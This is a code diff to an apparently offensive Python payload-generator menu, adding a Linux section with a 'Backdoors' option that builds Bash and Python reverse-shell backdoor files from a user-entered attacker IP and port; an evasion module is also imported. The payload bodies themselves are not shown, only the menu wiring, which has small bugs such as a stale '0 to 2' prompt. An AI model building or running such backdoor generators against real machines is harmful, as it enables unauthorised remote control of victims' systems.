@@ -1,5 +1,5 @@
 import os, sys, signal
-from modules import WindowsModule, pannelevasion
+from modules import WindowsModule, pannelevasion, LinuxModule
 from colorama import init, Fore, Style
 
 init()
@@ -94,6 +94,82 @@ def signal_handler(sig, frame):
 # Assigne le gestionnaire de signal au signal SIGINT (Ctrl+C)
 signal.signal(signal.SIGINT, signal_handler)
 
+
+#########################################################
+# ====================== Linux ======================== #
+#########################################################
+
+def linux():
+    recurrence()
+
+    print(f" {Fore.YELLOW}0{Fore.GREEN}. Go back")
+    print(f" {Fore.YELLOW}1{Fore.GREEN}. Exit")
+    print(f" {Fore.RED}2{Fore.GREEN}. Backdoors")
+    
+    choix = input(f"{Fore.YELLOW}Select 0 to 2 : {Fore.GREEN}")
+
+    if choix == "0": # Back
+        selectmenu()
+        
+    elif choix == "1": # Exit
+        exitapp()   
+        
+    elif choix == "2":
+        recurrence()
+        reverse_shell()
+        
+        
+    else: # Error
+        errormenu()
+        windows()
+   
+
+################## reverse_shell ##################
+
+def reverse_shell(): 
+    print(f" {Fore.YELLOW}0{Fore.GREEN}. Go back")
+    print(f" {Fore.YELLOW}1{Fore.GREEN}. Exit")
+    print(f" {Fore.RED}2{Fore.GREEN}. Bash")
+    print(f" {Fore.RED}3{Fore.GREEN}. Python")
+
+
+    choix = input(f"{Fore.YELLOW}Select 0 to 3 : {Fore.GREEN}")
+
+    if choix == "0": # Back
+        linux()
+        
+    elif choix == "1": # Exit
+        exitapp()
+
+    elif choix == "2": # reverse bash hidden
+        recurrence()
+        
+        print("") # Good looking        
+
+        Ipaddr = input(f"{Fore.YELLOW}Attacker IP : {Fore.GREEN}").strip()
+        Port = input(f"{Fore.YELLOW}Port : {Fore.GREEN}").strip()
+
+        LinuxModule.initfile("Backdoor_ReverseShellBash_Linux.txt")  
+        LinuxModule.reverseshell_bash(Ipaddr, Port)
+        done()
+        
+       
+    elif choix == "3": # reverse python
+        recurrence()
+        print("") # Good looking        
+
+        Ipaddr = input(f"{Fore.YELLOW}Attacker IP : {Fore.GREEN}").strip()
+        Port = input(f"{Fore.YELLOW}Port : {Fore.GREEN}").strip()
+
+        LinuxModule.initfile("Backdoor_ReverseShellPython_Linux.txt")   
+        LinuxModule.reverseshellPython(Ipaddr, Port) 
+        done()
+
+        
+    else: # Error
+        errormenu()
+        windows()
+   
 
 #########################################################
 # ====================== Windows ====================== #
@@ -866,7 +942,8 @@ def selectmenu():
     recurrence()
     print(f" {Fore.YELLOW}0{Fore.GREEN}. Exit")
     print(f" {Fore.RED}1{Fore.GREEN}. Infos -- Show program infos")
-    print(f" {Fore.RED}2{Fore.GREEN}. Windows payloads\n")
+    print(f" {Fore.RED}2{Fore.GREEN}. Windows payloads")
+    print(f" {Fore.RED}3{Fore.GREEN}. Linux payloads\n")
     
     choix = input(f"{Fore.YELLOW}Select 0 to 2 : {Fore.GREEN}")
 
@@ -877,6 +954,9 @@ def selectmenu():
         
     elif choix == "2":
         windows()
+
+    elif choix == "3":
+        linux()
         
     elif choix == "0": # Exit
         exitapp()
